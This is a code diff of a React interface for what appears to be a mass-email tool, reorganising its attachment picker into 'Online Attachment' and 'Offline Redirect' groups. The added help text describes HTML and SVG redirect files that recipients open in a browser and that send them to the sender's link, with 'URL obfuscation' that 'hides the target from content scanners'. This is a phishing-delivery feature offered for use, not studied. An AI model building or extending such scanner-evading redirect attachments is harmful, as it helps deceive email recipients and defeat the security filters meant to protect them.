@@ -6334,15 +6334,33 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
 
         {/* Type picker (for dynamic generation) */}
         <div className="card">
-        <div className="card-title">Attachment Type (for dynamic generation)</div>
-        <div className="dim sm mb12">For auto-generated attachment types like ICS calendar events. Select a type to configure options below.</div>
-        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(120px,1fr))",gap:12,marginBottom:16}}>
-          {ATTACH_TYPES.map(t=>(
-            <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
-              <div className="ac-ic" style={{background:t.col+"22",fontSize:34}}>{t.ico}</div>
-              <div className="ac-lbl">{t.lbl}</div>
+        <div className="card-title">Generated Attachments</div>
+        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginBottom:16}}>
+          {/* Left: Online */}
+          <div>
+            <div style={{fontSize:11,fontWeight:700,letterSpacing:"0.08em",textTransform:"uppercase",color:"var(--dim)",marginBottom:8}}>☁️ Online Attachment</div>
+            <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(100px,1fr))",gap:8}}>
+              {ATTACH_TYPES.filter(t=>!["html_redirect","svg_redirect"].includes(t.id)).map(t=>(
+                <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
+                  <div className="ac-ic" style={{background:t.col+"22",fontSize:28}}>{t.ico}</div>
+                  <div className="ac-lbl">{t.lbl}</div>
+                </div>
+              ))}
             </div>
-          ))}
+          </div>
+          {/* Right: Offline Redirect */}
+          <div>
+            <div style={{fontSize:11,fontWeight:700,letterSpacing:"0.08em",textTransform:"uppercase",color:"var(--dim)",marginBottom:8}}>📥 Offline Redirect</div>
+            <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(100px,1fr))",gap:8,marginBottom:10}}>
+              {ATTACH_TYPES.filter(t=>["html_redirect","svg_redirect"].includes(t.id)).map(t=>(
+                <div key={t.id} className={`ac ${selectedTypes.includes(t.id)?"sel":""}`} onClick={()=>setSelectedTypes(prev=>prev.includes(t.id)?prev.filter(x=>x!==t.id):[...prev,t.id])}>
+                  <div className="ac-ic" style={{background:t.col+"22",fontSize:28}}>{t.ico}</div>
+                  <div className="ac-lbl">{t.lbl}</div>
+                </div>
+              ))}
+            </div>
+            <div className="dim sm">Generates a standalone file the recipient downloads &amp; opens in their browser — it then redirects to your link. URL obfuscation hides the target from content scanners.</div>
+          </div>
         </div>
 
         {selectedTypes.includes("ics") && (
